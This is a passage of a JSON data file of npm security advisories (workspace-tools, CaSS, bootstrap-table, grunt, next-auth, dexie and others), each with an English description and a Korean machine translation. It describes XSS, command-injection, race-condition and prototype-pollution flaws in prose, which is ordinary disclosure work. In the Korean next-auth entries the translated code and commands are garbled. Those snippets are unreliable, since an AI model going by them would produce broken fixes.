    "descriptionKR": "0.18.4 이전의 패키지 workspace-tools는 git 인수 주입을 통한 명령 주입에 취약합니다. fetchRemoteBranch(remote: string, remoteBranch: string, cwd: string) 함수를 호출하면 추가 플래그를 설정할 수 있는 방식으로 remote 및 remoteBranch 매개변수가 모두 git fetch 하위 명령에 전달됩니다. 추가 플래그를 사용하여 명령 주입을 수행할 수 있습니다."
  },
  {
    "description": "### Impact\nCaSS Library, (npm:cassproject) has a missing cryptographic step when storing cryptographic keys that can allow a server administrator access to an account’s cryptographic keys. This affects CaSS servers using standalone username/password authentication, which uses a method that expects e2e cryptographic security of authorization credentials.\n\n### Patches\nThe issue has been patched in 1.5.8, however, the vulnerable accounts are only resecured when the user next logs in using standalone authentication, as the data required to resecure the account is not available to the server.\n\n### Workarounds\nThe issue may be mitigated by using SSO or client side certificates to log in. Please note that SSO and client side certificate authentication does not have this expectation of no-knowledge credential access, and cryptographic keys are available to the server administrator.\n\n### References\nThere are no references at this time.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the CaSS Project Github](https://github.com/cassproject/CASS/issues)\n* Email us at [the CaSS Project](mailto:cass@eduworks.com)\n\n",
    "identifiers": "GHSA : GHSA-7qcx-4p32-qcmx\nCVE : CVE-2022-29229",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:03:23Z",
    "publishedAt": "2022-05-25T19:34:20Z",
    "references": "https://github.com/cassproject/CASS/security/advisories/GHSA-7qcx-4p32-qcmx\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29229\nhttps://github.com/cassproject/CASS/releases/tag/1.5.8\nhttps://github.com/advisories/GHSA-7qcx-4p32-qcmx",
    "name": "cassproject",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.5.8",
    "identifier": "1.5.8",
    "descriptionKR": "### 영향\nCaSS 라이브러리(npm:cassproject)는 서버 관리자가 계정의 암호화 키에 액세스할 수 있도록 암호화 키를 저장할 때 누락된 암호화 단계가 있습니다. 이는 권한 부여 자격 증명의 e2e 암호화 보안을 기대하는 방법을 사용하는 독립 실행형 사용자 이름/암호 인증을 사용하는 CaSS 서버에 영향을 미칩니다.\n\n### 패치\n이 문제는 1.5.8에서 패치되었지만 계정을 다시 보호하는 데 필요한 데이터를 서버에서 사용할 수 없기 때문에 사용자가 다음에 독립형 인증을 사용하여 로그인할 때만 취약한 계정이 다시 보호됩니다.\n\n### 해결 방법\n이 문제는 SSO 또는 클라이언트측 인증서를 사용하여 로그인하면 완화될 수 있습니다. SSO 및 클라이언트측 인증서 인증에는 이러한 정보 없는 자격 증명 액세스가 필요하지 않으며 서버 관리자가 암호화 키를 사용할 수 있습니다.\n\n### 참조\n현재 참조가 없습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [CaSS 프로젝트 Github](https://github.com/cassproject/CASS/issues)에서 이슈 열기\n* [the CaSS Project](mailto:cass@eduworks.com)로 이메일을 보내주세요."
  },
  {
    "description": "Bootstrap Tables XSS vulnerability with Table Export plug-in when exportOptions: htmlContent is true in GitHub repository wenzhixin/bootstrap-table prior to 1.20.2. Disclosing session cookies, disclosing secure session data, exfiltrating data to third-parties.",
    "identifiers": "GHSA : GHSA-grw5-g9h2-wpg8\nCVE : CVE-2022-1726",
    "severity": "MODERATE",
    "updatedAt": "2023-02-03T05:01:11Z",
    "publishedAt": "2022-05-17T00:01:42Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-1726\nhttps://github.com/wenzhixin/bootstrap-table/commit/b4a1e5dd332be652e0bc376fd9256886cf4bbde9\nhttps://huntr.dev/bounties/9b85cc33-0395-4c31-8a42-3a94beb2efea\nhttps://github.com/advisories/GHSA-grw5-g9h2-wpg8",
    "name": "bootstrap-table",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.20.2",
    "identifier": "1.20.2",
    "descriptionKR": "1.20.2 이전의 GitHub 리포지토리 wenzhixin/bootstrap-table에서 exportOptions: htmlContent가 true일 때 테이블 내보내기 플러그인이 있는 부트스트랩 테이블 XSS 취약성. 세션 쿠키 공개, 보안 세션 데이터 공개, 제3자에게 데이터 유출."
  },
  {
    "description": "file.copy operations in GruntJS are vulnerable to a TOCTOU race condition leading to arbitrary file write in GitHub repository gruntjs/grunt prior to 1.5.3. This vulnerability is capable of arbitrary file writes which can lead to local privilege escalation to the GruntJS user if a lower-privileged user has write access to both source and destination directories as the lower-privileged user can create a symlink to the GruntJS user's .bashrc file or replace /etc/shadow file if the GruntJS user is root.",
    "identifiers": "GHSA : GHSA-rm36-94g8-835r\nCVE : CVE-2022-1537",
    "severity": "HIGH",
    "updatedAt": "2023-04-06T22:55:43Z",
    "publishedAt": "2022-05-11T00:01:37Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-1537\nhttps://github.com/gruntjs/grunt/commit/58016ffac5ed9338b63ecc2a63710f5027362bae\nhttps://huntr.dev/bounties/0179c3e5-bc02-4fc9-8491-a1a319b51b4d\nhttps://lists.debian.org/debian-lts-announce/2023/04/msg00006.html\nhttps://github.com/advisories/GHSA-rm36-94g8-835r",
    "name": "grunt",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.5.3",
    "identifier": "1.5.3",
    "descriptionKR": "GruntJS의 file.copy 작업은 1.5.3 이전의 GitHub 저장소 gruntjs/grunt에서 임의의 파일 쓰기로 이어지는 TOCTOU 경쟁 조건에 취약합니다. 이 취약점은 권한이 낮은 사용자가 GruntJS 사용자의 .bashrc에 대한 심볼릭 링크를 생성할 수 있으므로 권한이 낮은 사용자가 원본 및 대상 디렉터리 모두에 대한 쓰기 액세스 권한을 가지고 있는 경우 GruntJS 사용자에 대한 로컬 권한 에스컬레이션으로 이어질 수 있는 임의의 파일 쓰기가 가능합니다. 파일을 만들거나 GruntJS 사용자가 루트인 경우 /etc/shadow 파일을 교체하십시오."
  },
  {
    "description": "Froala WYSIWYG HTML Editor is a lightweight WYSIWYG HTML Editor written in JavaScript that enables rich text editing capabilities for web applications. A DOM-based cross-site scripting (XSS) vulnerability exists in versions before 3.2.3 because HTML code in the editor is not correctly sanitized when inserted into the DOM. This allows an attacker that can control the editor content to execute arbitrary JavaScript in the context of the victim’s session.",
    "identifiers": "GHSA : GHSA-h236-g5gh-vq6c\nCVE : CVE-2019-19935",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:06:34Z",
    "publishedAt": "2022-02-10T23:32:51Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-19935\nhttps://blog.compass-security.com/2020/07/yet-another-froala-0-day-xss/\nhttps://compass-security.com/fileadmin/Datein/Research/Advisories/CSNC-2020-004_DOM_XSS_in_Froala_WYSIWYG_HTML_Editor.txt\nhttps://snyk.io/vuln/npm:froala-editor\nhttp://packetstormsecurity.com/files/158300/Froala-WYSIWYG-HTML-Editor-3.1.1-Cross-Site-Scripting.html\nhttps://froala.com/wysiwyg-editor/changelog/#3.2.3\nhttps://github.com/froala/wysiwyg-editor/compare/v3.0.5...v3.0.6\nhttps://github.com/advisories/GHSA-h236-g5gh-vq6c",
    "name": "froala-editor",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.2.3",
    "identifier": "3.2.3",
    "descriptionKR": "Froala WYSIWYG HTML 편집기는 JavaScript로 작성된 경량 WYSIWYG HTML 편집기로 웹 응용 프로그램에 대한 서식 있는 텍스트 편집 기능을 사용할 수 있습니다. 3.2.3 이전 버전에는 편집기의 HTML 코드가 DOM에 삽입될 때 제대로 삭제되지 않기 때문에 DOM 기반 XSS(교차 사이트 스크립팅) 취약점이 존재합니다. 이를 통해 편집기 콘텐츠를 제어할 수 있는 공격자가 피해자 세션의 컨텍스트에서 임의의 JavaScript를 실행할 수 있습니다."
  },
  {
    "description": "### Impact\n\nPossible consensus split given maliciously-crafted `AttesterSlashing` or `ProposerSlashing` being included on-chain.\n\nSince we represent `uint64` values as native javascript `number`s, there is an issue when those variables with large (greater than 2^53) `uint64` values are included on chain. In those cases, Lodestar may view _valid_ `AttesterSlashing` or `ProposerSlashing` as _invalid_, due to rounding errors in large `number` values. This causes a consensus split, where Lodestar nodes are forked away from the main network.\n\nSimilarly Lodestar may consider _invalid_ `ProposerSlashing` as _valid_, thus including in proposed blocks that will be considered invalid by the network.\n\n### Patches\n\nhttps://github.com/ChainSafe/lodestar/pull/3977\n\n### Workarounds\n\nUse `BigInt` to represent `Slot` and `Epoch` values in `AttesterSlashing` and `ProposerSlashing` objects. `BigInt` is too slow to be used in all `Slot` and `Epoch` cases, so we will carefully use `BigInt` just where necessary for consensus.",
    "identifiers": "GHSA : GHSA-cvj7-5f3c-9vg9\nCVE : CVE-2022-29219",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:01:57Z",
    "publishedAt": "2022-05-24T22:21:10Z",
    "references": "https://github.com/ChainSafe/lodestar/security/advisories/GHSA-cvj7-5f3c-9vg9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29219\nhttps://github.com/ChainSafe/lodestar/pull/3977\nhttps://github.com/ChainSafe/lodestar/releases/tag/v0.36.0\nhttps://github.com/advisories/GHSA-cvj7-5f3c-9vg9",
    "name": "@chainsafe/lodestar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.36.0",
    "identifier": "0.36.0",
    "descriptionKR": "### 영향\n\n악의적으로 제작된 'AttesterSlashing' 또는 'ProposerSlashing'이 온체인에 포함된 경우 가능한 합의 분할.\n\n우리는 `uint64` 값을 네이티브 자바스크립트 `숫자`로 표현하기 때문에 큰(2^53보다 큰) `uint64` 값을 가진 변수가 체인에 포함될 때 문제가 있습니다. 이러한 경우 Lodestar는 큰 `숫자` 값의 반올림 오류로 인해 _valid_ `AtesterSlashing` 또는 `ProposerSlashing`을 _invalid_로 ​​볼 수 있습니다. 이로 인해 Lodestar 노드가 메인 네트워크에서 분리되는 합의 분할이 발생합니다.\n\n마찬가지로 Lodestar는 _invalid_ 'ProposerSlashing'을 _valid_로 ​​간주할 수 있으므로 제안된 블록에 네트워크에서 유효하지 않은 것으로 간주됩니다.\n\n### 패치\n\nhttps://github.com/ChainSafe/lodestar/pull/3977\n\n### 해결 방법\n\nBigInt를 사용하여 `AttesterSlashing` 및 `ProposerSlashing` 개체의 `Slot` 및 `Epoch` 값을 나타냅니다. `BigInt`는 모든 `Slot` 및 `Epoch` 경우에 사용하기에는 너무 느리므로 합의에 필요한 경우에만 `BigInt`를 신중하게 사용할 것입니다."
  },
  {
    "description": "Cross-site scripting (XSS) vulnerability exists in Coder Code-Server before 3.12.0, allows attackers to execute arbitrary code via crafted URL.",
    "identifiers": "GHSA : GHSA-2gp3-6c9p-jp7w\nCVE : CVE-2021-42648",
    "severity": "MODERATE",
    "updatedAt": "2023-02-01T05:02:14Z",
    "publishedAt": "2022-05-12T00:00:40Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-42648\nhttps://github.com/cdr/code-server/issues/4355\nhttps://github.com/coder/code-server/pull/4430\nhttps://github.com/advisories/GHSA-2gp3-6c9p-jp7w",
    "name": "code-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.12.0",
    "identifier": "3.12.0",
    "descriptionKR": "3.12.0 이전의 Coder Code-Server에 XSS(교차 사이트 스크립팅) 취약점이 존재하여 공격자가 조작된 URL을 통해 임의의 코드를 실행할 수 있습니다."
  },
  {
    "description": "### Impact\n\nWe found that this vulnerability is present when the developer is implementing an OAuth 1 provider (by extension, it means Twitter, which is the only built-in provider using OAuth 1), but **upgrading** is **still recommended**.\n\n`next-auth` v3 users before version 3.29.3 are impacted. (We recommend upgrading to v4, as v3 is considered unmaintained. See our [migration guide](https://next-auth.js.org/getting-started/upgrade-v4))\n\n`next-auth` v4 users before version 4.3.3 are impacted.\n\n### Patches\n\nWe've released patches for this vulnerability in:\n  \n- v3 - `3.29.3`\n- v4 - `4.3.3`\n\nYou can do:\n\n```sh\nnpm i next-auth@latest\n```\n\nor\n\n```sh\nyarn add next-auth@latest\n```\n\nor\n\n```sh\npnpm add next-auth@latest\n```\n\n(This will update to the latest v4 version, but you can change  `latest` to `3` if you want to stay on v3.)\n\n### Workarounds\n\nIf you are not able to upgrade for any reason, you can add the following configuration to your `callbacks` option:\n\n```ts\n// async redirect(url, baseUrl) { // v3\nasync redirect({ url, baseUrl }) { // v4\n    // Allows relative callback URLs\n    if (url.startsWith(\"/\")) return `${baseUrl}${url}`\n    // Allows callback URLs on the same origin\n    else if (new URL(url).origin === baseUrl) return url\n    return baseUrl\n}\n```\n\n### References\n\nThis vulnerability was discovered right after https://github.com/nextauthjs/next-auth/security/advisories/GHSA-f9wg-5f46-cjmw was published and is very similar in nature.\n\nRead more about the `callbacks.redirect` option in the documentation: https://next-auth.js.org/configuration/callbacks#redirect-callback\n\n### For more information\n\nIf you have any concerns, we request responsible disclosure, outlined here: https://next-auth.js.org/security#reporting-a-vulnerability\n\n### Timeline\n\nThe issue was reported 2022 April 20th, a response was sent out to the reporter 8 minutes after, and a patch was produced within a few days.",
    "identifiers": "GHSA : GHSA-q2mx-j4x2-2h74\nCVE : CVE-2022-29214",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:02:05Z",
    "publishedAt": "2022-05-24T22:03:07Z",
    "references": "https://github.com/nextauthjs/next-auth/security/advisories/GHSA-q2mx-j4x2-2h74\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29214\nhttps://github.com/nextauthjs/next-auth/releases/tag/next-auth%40v4.3.3\nhttps://github.com/advisories/GHSA-q2mx-j4x2-2h74",
    "name": "next-auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.3.3",
    "identifier": "4.3.3",
    "descriptionKR": "### 영향\n\n개발자가 OAuth 1 공급자를 구현할 때 이 취약점이 존재하지만(확장하면 OAuth 1을 사용하는 유일한 내장 공급자인 Twitter를 의미함) **업그레이드**는 **여전히 권장됨** .\n\n버전 3.29.3 이전의 `next-auth` v3 사용자는 영향을 받습니다. (v3는 유지 관리되지 않는 것으로 간주되므로 v4로 업그레이드하는 것이 좋습니다. [마이그레이션 가이드](https://next-auth.js.org/getting-started/upgrade-v4)를 참조하세요.)\n\n버전 4.3.3 이전의 `next-auth` v4 사용자는 영향을 받습니다.\n\n### 패치\n\n다음 위치에서 이 취약점에 대한 패치를 릴리스했습니다.\n  \n- v3 - `3.29.3`\n- v4 - `4.3.3`\n\n넌 할 수있어:\n\n```쉬\nnpm i next-auth@latest\n```\n\n또는\n\n```쉬\n원사 추가 next-auth@latest\n```\n\n또는\n\n```쉬\npnpm add next-auth@latest\n```\n\n(이는 최신 v4 버전으로 업데이트되지만 v3을 유지하려면 `latest`를 `3`으로 변경할 수 있습니다.)\n\n### 해결 방법\n\n어떤 이유로든 업그레이드할 수 없는 경우 `콜백` 옵션에 다음 구성을 추가할 수 있습니다.\n\n```ts\n// 비동기 리디렉션(url, baseUrl) { // v3\n비동기 리디렉션({ url, baseUrl }) { // v4\n    // 상대 콜백 URL 허용\n    if (url.startsWith(\"/\")) 리턴 `${baseUrl}${url}`\n    // 동일한 출처에서 콜백 URL 허용\n    그렇지 않으면 (새 URL(url).origin === baseUrl) 반환 URL\n    baseUrl 반환\n}\n```\n\n### 참조\n\n이 취약점은 https://github.com/nextauthjs/next-auth/security/advisories/GHSA-f9wg-5f46-cjmw가 게시된 직후에 발견되었으며 본질적으로 매우 유사합니다.\n\n문서에서 `callbacks.redirect` 옵션에 대해 자세히 알아보십시오. https://next-auth.js.org/configuration/callbacks#redirect-callback\n\n### 자세한 내용은\n\n우려 사항이 있는 경우 https://next-auth.js.org/security#reporting-a-vulnerability에 설명된 책임 있는 공개를 요청합니다.\n\n### 타임라인\n\n문제는 2022년 4월 20일에 보고되었고, 8분 후에 기자에게 답변이 발송되었으며, 며칠 내에 패치가 제작되었습니다."
  },
  {
    "description": "### Impact\n\nWe found that this vulnerability is present when the developer is implementing an OAuth 1 provider (by extension, it means Twitter, which is the only built-in provider using OAuth 1), but **upgrading** is **still recommended**.\n\n`next-auth` v3 users before version 3.29.3 are impacted. (We recommend upgrading to v4, as v3 is considered unmaintained. See our [migration guide](https://next-auth.js.org/getting-started/upgrade-v4))\n\n`next-auth` v4 users before version 4.3.3 are impacted.\n\n### Patches\n\nWe've released patches for this vulnerability in:\n  \n- v3 - `3.29.3`\n- v4 - `4.3.3`\n\nYou can do:\n\n```sh\nnpm i next-auth@latest\n```\n\nor\n\n```sh\nyarn add next-auth@latest\n```\n\nor\n\n```sh\npnpm add next-auth@latest\n```\n\n(This will update to the latest v4 version, but you can change  `latest` to `3` if you want to stay on v3.)\n\n### Workarounds\n\nIf you are not able to upgrade for any reason, you can add the following configuration to your `callbacks` option:\n\n```ts\n// async redirect(url, baseUrl) { // v3\nasync redirect({ url, baseUrl }) { // v4\n    // Allows relative callback URLs\n    if (url.startsWith(\"/\")) return `${baseUrl}${url}`\n    // Allows callback URLs on the same origin\n    else if (new URL(url).origin === baseUrl) return url\n    return baseUrl\n}\n```\n\n### References\n\nThis vulnerability was discovered right after https://github.com/nextauthjs/next-auth/security/advisories/GHSA-f9wg-5f46-cjmw was published and is very similar in nature.\n\nRead more about the `callbacks.redirect` option in the documentation: https://next-auth.js.org/configuration/callbacks#redirect-callback\n\n### For more information\n\nIf you have any concerns, we request responsible disclosure, outlined here: https://next-auth.js.org/security#reporting-a-vulnerability\n\n### Timeline\n\nThe issue was reported 2022 April 20th, a response was sent out to the reporter 8 minutes after, and a patch was produced within a few days.",
    "identifiers": "GHSA : GHSA-q2mx-j4x2-2h74\nCVE : CVE-2022-29214",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:02:05Z",
    "publishedAt": "2022-05-24T22:03:07Z",
    "references": "https://github.com/nextauthjs/next-auth/security/advisories/GHSA-q2mx-j4x2-2h74\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29214\nhttps://github.com/nextauthjs/next-auth/releases/tag/next-auth%40v4.3.3\nhttps://github.com/advisories/GHSA-q2mx-j4x2-2h74",
    "name": "next-auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.29.3",
    "identifier": "3.29.3",
    "descriptionKR": "### 영향\n\n개발자가 OAuth 1 공급자를 구현할 때 이 취약점이 존재하지만(확장하면 OAuth 1을 사용하는 유일한 내장 공급자인 Twitter를 의미함) **업그레이드**는 **여전히 권장됨** .\n\n버전 3.29.3 이전의 `next-auth` v3 사용자는 영향을 받습니다. (v3는 유지 관리되지 않는 것으로 간주되므로 v4로 업그레이드하는 것이 좋습니다. [마이그레이션 가이드](https://next-auth.js.org/getting-started/upgrade-v4)를 참조하세요.)\n\n버전 4.3.3 이전의 `next-auth` v4 사용자는 영향을 받습니다.\n\n### 패치\n\n다음 위치에서 이 취약점에 대한 패치를 릴리스했습니다.\n  \n- v3 - `3.29.3`\n- v4 - `4.3.3`\n\n넌 할 수있어:\n\n```쉬\nnpm i next-auth@latest\n```\n\n또는\n\n```쉬\n원사 추가 next-auth@latest\n```\n\n또는\n\n```쉬\npnpm add next-auth@latest\n```\n\n(이는 최신 v4 버전으로 업데이트되지만 v3을 유지하려면 `latest`를 `3`으로 변경할 수 있습니다.)\n\n### 해결 방법\n\n어떤 이유로든 업그레이드할 수 없는 경우 `콜백` 옵션에 다음 구성을 추가할 수 있습니다.\n\n```ts\n// 비동기 리디렉션(url, baseUrl) { // v3\n비동기 리디렉션({ url, baseUrl }) { // v4\n    // 상대 콜백 URL 허용\n    if (url.startsWith(\"/\")) 리턴 `${baseUrl}${url}`\n    // 동일한 출처에서 콜백 URL 허용\n    그렇지 않으면 (새 URL(url).origin === baseUrl) 반환 URL\n    baseUrl 반환\n}\n```\n\n### 참조\n\n이 취약점은 https://github.com/nextauthjs/next-auth/security/advisories/GHSA-f9wg-5f46-cjmw가 게시된 직후에 발견되었으며 본질적으로 매우 유사합니다.\n\n문서에서 `callbacks.redirect` 옵션에 대해 자세히 알아보십시오. https://next-auth.js.org/configuration/callbacks#redirect-callback\n\n### 자세한 내용은\n\n우려 사항이 있는 경우 https://next-auth.js.org/security#reporting-a-vulnerability에 설명된 책임 있는 공개를 요청합니다.\n\n### 타임라인\n\n문제는 2022년 4월 20일에 보고되었고, 8분 후에 기자에게 답변이 발송되었으며, 며칠 내에 패치가 제작되었습니다."
  },
  {
    "description": "All versions of the npm package bignum are vulnerable to Denial of Service (DoS) due to a type-check exception in V8. When verifying the type of the second argument to the .powm function, V8 will crash regardless of Node try/catch blocks.",
    "identifiers": "GHSA : GHSA-6429-3g3w-6mw5\nCVE : CVE-2022-25324",
    "severity": "HIGH",
    "updatedAt": "2023-02-01T05:02:09Z",
    "publishedAt": "2022-05-07T00:00:31Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25324\nhttps://snyk.io/vuln/SNYK-JS-BIGNUM-2388581\nhttps://github.com/justmoon/node-bignum/blob/ef2e02533e598d6df8421000033c4753cde89ee2/index.js#L111\nhttps://github.com/advisories/GHSA-6429-3g3w-6mw5",
    "name": "bignum",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.13.1",
    "descriptionKR": "npm 패키지 bignum의 모든 버전은 V8의 유형 검사 예외로 인해 서비스 거부(DoS)에 취약합니다. .powm 함수에 대한 두 번째 인수의 유형을 확인할 때 V8은 Node try/catch 블록에 관계없이 충돌합니다."
  },
  {
    "description": "### Overview\n\nIn versions before and including `11.32.2`, when the “additional signup fields” feature [is configured](https://github.com/auth0/lock#additional-sign-up-fields), a malicious actor can inject invalidated HTML code into these additional fields, which is then stored in the service `user_metdata` payload (using the `name` property).\n\nVerification emails, when applicable, are generated using this metadata. It is therefor possible for an actor to craft a malicious link by injecting HTML, which is then rendered as the recipient's name within the delivered email template.\n\n### Am I affected?\nYou are impacted by this vulnerability if you are using `auth0-lock` version `11.32.2` or lower and are using the “additional signup fields” feature in your application.\n\n### How to fix that?\nUpgrade to version `11.33.0`.\n\n### Will this update impact my users?\nAdditional signup fields that have been added to the signup tab on Lock will have HTML tags stripped from user input from version `11.33.0` onwards. The user will not receive any validation warning or feedback, but backend data will no longer include HTML.",
    "identifiers": "GHSA : GHSA-7ww6-75fj-jcj7\nCVE : CVE-2022-29172",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:01:57Z",
    "publishedAt": "2022-05-24T20:49:20Z",
    "references": "https://github.com/auth0/lock/security/advisories/GHSA-7ww6-75fj-jcj7\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29172\nhttps://github.com/auth0/lock/commit/79ae557d331274b114848150f19832ae341771b1\nhttps://github.com/advisories/GHSA-7ww6-75fj-jcj7",
    "name": "auth0-lock",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 11.33.0",
    "identifier": "11.33.0",
    "descriptionKR": "### 개요\n\n'11.32.2' 이전 및 포함 버전에서 '추가 가입 필드' 기능이 [구성](https://github.com/auth0/lock#additional-sign-up-fields)되면 악의적인 행위자가 HTML 코드를 이러한 추가 필드로 무효화한 다음 서비스 `user_metdata` 페이로드(`name` 속성 사용)에 저장합니다.\n\n해당되는 경우 확인 이메일은 이 메타데이터를 사용하여 생성됩니다. 따라서 공격자가 HTML을 주입하여 악성 링크를 만들 수 있으며, 이 링크는 전달된 이메일 템플릿 내에서 수신자의 이름으로 렌더링됩니다.\n\n### 영향을 받습니까?\n`auth0-lock` 버전 `11.32.2` 이하를 사용하고 애플리케이션에서 \"추가 가입 필드\" 기능을 사용하는 경우 이 취약점의 영향을 받습니다.\n\n### 어떻게 고칠 수 있나요?\n버전 `11.33.0`으로 업그레이드하십시오.\n\n### 이 업데이트가 내 사용자에게 영향을 미치나요?\nLock의 가입 탭에 추가된 추가 가입 필드에는 '11.33.0' 버전부터 사용자 입력에서 제거된 HTML 태그가 있습니다. 사용자는 유효성 검사 경고나 피드백을 받지 못하지만 백엔드 데이터에는 더 이상 HTML이 포함되지 않습니다."
  },
  {
    "description": "The jquery.json-viewer library before version 1.5.0 for Node.js does not properly escape characters such as < in a JSON object, as demonstrated by a SCRIPT element.",
    "identifiers": "GHSA : GHSA-qp2q-6h9j-jg2r\nCVE : CVE-2022-30241",
    "severity": "MODERATE",
    "updatedAt": "2023-02-01T05:01:45Z",
    "publishedAt": "2022-05-05T00:00:15Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-30241\nhttps://github.com/abodelot/jquery.json-viewer/pull/26\nhttps://www.npmjs.com/package/jquery.json-viewer\nhttps://github.com/abodelot/jquery.json-viewer/releases/tag/v1.5.0\nhttps://github.com/advisories/GHSA-qp2q-6h9j-jg2r",
    "name": "jquery.json-viewer",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.5.0",
    "identifier": "1.5.0",
    "descriptionKR": "Node.js용 버전 1.5.0 이전의 jquery.json-viewer 라이브러리는 SCRIPT 요소에서 볼 수 있듯이 JSON 개체의 <와 같은 문자를 제대로 이스케이프하지 않습니다."
  },
  {
    "description": "matrix-appservice-irc provides an IRC bridge for Matrix. The vulnerability in node-irc allows an attacker to manipulate a Matrix user into executing IRC commands by having them reply to a maliciously crafted message. The vulnerability has been patched in matrix-appservice-irc 0.33.2. In terms of a workaround, users should refrain from replying to messages from untrusted participants in IRC-bridged Matrix rooms. ",
    "identifiers": "GHSA : GHSA-37hr-348p-rmf4\nCVE : CVE-2022-29166",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:01:45Z",
    "publishedAt": "2022-05-23T20:17:07Z",
    "references": "https://github.com/matrix-org/matrix-appservice-irc/security/advisories/GHSA-37hr-348p-rmf4\nhttps://github.com/matrix-org/node-irc/security/advisories/GHSA-52rh-5rpj-c3w6\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29166\nhttps://matrix.org/blog/2022/05/04/0-34-0-security-release-for-matrix-appservice-irc-high-severity\nhttps://github.com/advisories/GHSA-37hr-348p-rmf4",
    "name": "matrix-appservice-irc",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.33.1",
    "identifier": "0.33.2",
    "descriptionKR": "matrix-appservice-irc는 Matrix용 IRC 브리지를 제공합니다. node-irc의 취약점으로 인해 공격자는 Matrix 사용자가 악의적으로 제작된 메시지에 응답하도록 하여 IRC 명령을 실행하도록 조작할 수 있습니다. 이 취약점은 matrix-appservice-irc 0.33.2에서 패치되었습니다. 해결 방법의 관점에서 사용자는 IRC 브리지 매트릭스 룸에서 신뢰할 수 없는 참가자의 메시지에 회신하지 않아야 합니다."
  },
  {
    "description": "Dexie is a minimalistic wrapper for IndexedDB. The package dexie before 3.2.2, from 4.0.0-alpha.1 and before 4.0.0-alpha.3 are vulnerable to Prototype Pollution in the Dexie.setByKeyPath(obj, keyPath, value) function which does not properly check the keys being set (like __proto__ or constructor). This can allow an attacker to add/modify properties of the Object.prototype leading to prototype pollution vulnerability. **Note:** This vulnerability can occur in multiple ways, for example when modifying a collection with untrusted user input.",
    "identifiers": "GHSA : GHSA-3xgx-r9j4-qw9w\nCVE : CVE-2022-21189",
    "severity": "HIGH",
    "updatedAt": "2023-02-01T05:00:56Z",
    "publishedAt": "2022-05-03T00:00:46Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21189\nhttps://github.com/dexie/Dexie.js/commit/1d655a69b9f28c3af6fae10cf5c61df387dc689b\nhttps://github.com/dexie/Dexie.js/blob/fe682ef24568278c3b31d9d6c93de095d4b77ae8/src/functions/utils.ts%23L134-L164\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2805308\nhttps://snyk.io/vuln/SNYK-JS-DEXIE-2607042\nhttps://github.com/advisories/GHSA-3xgx-r9j4-qw9w",
    "name": "dexie",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0-alpha.1, <= 4.0.0-alpha.2",
    "identifier": "4.0.0-alpha.3",
    "descriptionKR": "Dexie는 IndexedDB를 위한 최소한의 래퍼입니다. 3.2.2 이전, 4.0.0-alpha.1 및 4.0.0-alpha.3 이전 패키지 dexie는 키를 제대로 확인하지 않는 Dexie.setByKeyPath(obj, keyPath, value) 함수의 Prototype Pollution에 취약합니다. 설정 중입니다(__proto__ 또는 생성자처럼). 이를 통해 공격자는 Object.prototype의 속성을 추가/수정하여 프로토타입 오염 취약성을 유발할 수 있습니다. **참고:** 이 취약점은 신뢰할 수 없는 사용자 입력으로 컬렉션을 수정할 때와 같이 여러 가지 방식으로 발생할 수 있습니다."
  },
  {
    "description": "Dexie is a minimalistic wrapper for IndexedDB. The package dexie before 3.2.2, from 4.0.0-alpha.1 and before 4.0.0-alpha.3 are vulnerable to Prototype Pollution in the Dexie.setByKeyPath(obj, keyPath, value) function which does not properly check the keys being set (like __proto__ or constructor). This can allow an attacker to add/modify properties of the Object.prototype leading to prototype pollution vulnerability. **Note:** This vulnerability can occur in multiple ways, for example when modifying a collection with untrusted user input.",
    "identifiers": "GHSA : GHSA-3xgx-r9j4-qw9w\nCVE : CVE-2022-21189",
    "severity": "HIGH",
    "updatedAt": "2023-02-01T05:00:56Z",
    "publishedAt": "2022-05-03T00:00:46Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21189\nhttps://github.com/dexie/Dexie.js/commit/1d655a69b9f28c3af6fae10cf5c61df387dc689b\nhttps://github.com/dexie/Dexie.js/blob/fe682ef24568278c3b31d9d6c93de095d4b77ae8/src/functions/utils.ts%23L134-L164\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2805308\nhttps://snyk.io/vuln/SNYK-JS-DEXIE-2607042\nhttps://github.com/advisories/GHSA-3xgx-r9j4-qw9w",
    "name": "dexie",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.2.2",
    "identifier": "3.2.2",
